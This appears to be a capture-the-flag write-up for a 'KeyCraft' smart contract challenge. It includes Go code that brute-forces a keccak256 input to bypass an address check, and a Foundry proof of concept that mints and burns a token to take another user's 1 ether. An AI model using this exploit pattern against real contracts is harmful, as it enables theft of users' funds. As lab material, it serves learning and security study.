# Analysis

To bypass the `checkAddress` modifier, we can bruteforce the input parameter `b`, the pseudo code:
1. use a number `b`, starts from 0
2. convert it to byte array, eg: hex"00"
3. calculate `keccak256(b) >> 108 << 240 >> 240` 
4. if the result is 13057, then we found our `b`, we print `b` and the attacker address, which is `uint160(uint256(keccak256(b)))`
5. if it's not, increase `b` by 1 and loop again

I did this with Golang:
```go 
package main

import (
	"fmt"

	"github.com/holiman/uint256"
	"golang.org/x/crypto/sha3"
)

func Sha3(bs []byte) []byte {
	hash := sha3.NewLegacyKeccak256()
	hash.Write(bs)
	return hash.Sum(nil)
}

func main() {
	v13057 := uint256.NewInt(13057)
	b := uint256.NewInt(0)
	for {
		hash := Sha3(b.Bytes())
		attacker := uint256.NewInt(0)
		attacker.SetBytes(hash)

		a := uint256.NewInt(0)
		a.SetBytes(hash)
		a.Rsh(a, 108)
		a.Lsh(a, 240)
		a.Rsh(a, 240)

		if a.Eq(v13057) {
			fmt.Println("found")
			fmt.Println("b:", b.Hex())
			atk := attacker.Bytes20()
			fmt.Printf("attacker: 0x%x\n", atk[:])
			return
		}

		b.AddUint64(b, 1)
	}

}

```

The result:

> b: 0x1dc4
> 
> attacker: 0xc1b0f68c233018d3faf76adabe5bfd70748d0f50

We can successfully mint a Token with this `b`, then burn it to get 1 ether.

# POC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/KeyCraft.sol";

contract KC is Test {
    KeyCraft k;
    address owner;
    address user;
    address attacker;

    function setUp() public {
        owner = makeAddr("owner");
        user = makeAddr("user");
        attacker = 0xC1b0f68C233018d3fAf76adABE5bfD70748d0f50;

        vm.deal(user, 1 ether);

        vm.startPrank(owner);
        k = new KeyCraft("KeyCraft", "KC");
        vm.stopPrank();

        vm.startPrank(user);
        k.mint{value: 1 ether}(hex"dead");
        vm.stopPrank();
    }

    function testKeyCraft() public {
        vm.startPrank(attacker);

        //Solution

		bytes memory b = hex"1dc4";
		k.mint(b);
		k.burn(2); 

        vm.stopPrank();
        assertEq(attacker.balance, 1 ether);
    }
}

```
